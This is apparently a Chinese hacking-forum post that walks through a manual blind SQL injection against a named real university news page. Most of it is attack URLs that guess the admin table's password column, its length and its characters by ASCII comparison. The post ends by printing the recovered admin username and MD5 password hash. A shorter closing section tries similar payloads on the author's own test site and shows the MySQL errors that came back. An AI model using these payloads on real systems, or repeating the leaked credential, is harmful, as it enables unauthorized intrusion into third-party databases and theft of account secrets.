
# sql 怎么还是如此之多呢？

> 原文：[`www.pediy.com/kssd/pediy12/114881.html`](https://www.pediy.com/kssd/pediy12/114881.html)

## 一次 sql 注入实例

目标：`http://www.ieidjtu.edu.cn/news.asp?id=147` 只是随便测试找到的，本想直接使用 啊 D 直接搞定，但是发现 啊 D 的结果不是很满意，很是悲哀，不能猜到密码字段，本想放弃，但总觉得太可惜了，还是发扬一下 黑客精神吧，手工操作，但用户名字段的不是很复杂，所以猜想密码字段也不会是很复杂，因此开猜..

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20count(pword)%20from%20admin)>0` 失败

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20count(pws)%20from%20admin)>0` 失败

但怎么说人品还是不错的，当

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20count(pass)%20from%20admin)>0` 页面返回正常了 千里之行刚刚开始，猜长度吧 既然手动猜解，人脑总比工具灵活吧，这也是人为人，工具是工具的主要原因，呵呵，直接判断是否是 32 位或者 16 位。因为一般都是加密的嘛，现在真是很少有明文的，但遇到明文是我的人品差...

没办法人品就是好

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20len(pass)%20from%20admin)=32` 返回正常

猜测内容吧，还等啥呀，开始第一位

先判断是否是数字 0-9  Ascii 48-57

a-z Ascii 97-122

A-Z Ascii 65-90

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,1,1))%20from%20admin)>48` 正常

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,1,1))%20from%20admin)>57` 失败

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,1,1))%20from%20admin)>53` 正常

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,1,1))%20from%20admin)>55` 正常

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,1,1))%20from%20admin)>56` 异常 说明 第一位是 56 对应是 8

开始第二位

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,2,1))%20from%20admin)>57` 正常 说明不是数字

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,2,1))%20from%20admin)>97` 正常 说明是小写字母

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,2,1))%20from%20admin)>122` 异常

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,2,1))%20from%20admin)>110` 异常

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,2,1))%20from%20admin)>102` 异常

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,2,1))%20from%20admin)>100` 异常

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,2,1))%20from%20admin)>98` 正常

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,2,1))%20from%20admin)>99` 正常

`http://www.ieidjtu.edu.cn/news.asp?id=147%20and%20(select%20top%201%20asc(mid(pass,2,1))%20from%20admin)=100` 正常 说明是 100 第二位是 100 对应 ascii 码 d

下面就不做了 直接使用啊 D 将猜到的 密码字段直接加入 设置中 重新扫描就可以了，最终得到 用户名 `admin` 密码 `8de3500fd334b6b7180a2156cfa5132e`

但是也很悲剧 这个 md5 不能破解 郁闷了 没有办法 呵呵

看了,在我自己的网站作下测试，建了个无 `'` 封闭的值，做员工薪水列表的下拉选择表

[`coolcall.0fees.net/attack/`](http://coolcall.0fees.net/attack/)

在下拉列表选定值后提交，拦截数据进行修改

一、提交： `2 or (select count(salary) from num)>0`

运行成功，员工列表内容全列出

二、打入下面的命令，出错了

提交： `2 or (select len(salary) from num)=32`

Error performing query: Column count of mysql.proc is wrong. Expected 20, found 16. The table is probably corrupted

错误执行查询：对 mysql.proc 的列计数错误。预期 20，发现 16。该表可能已损坏

是版本问题吗？

三、不管上面，继续猜 `num` 表的 `salary` 列中的字符

提交： `2 or (select top 1 asc(mid(salary,1,1)) from num)>48`

出现错误，这不稀奇了，因为含有","的特殊字符

Error performing query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 asc(mid(salary,1,1)) from num)>48' at line 1
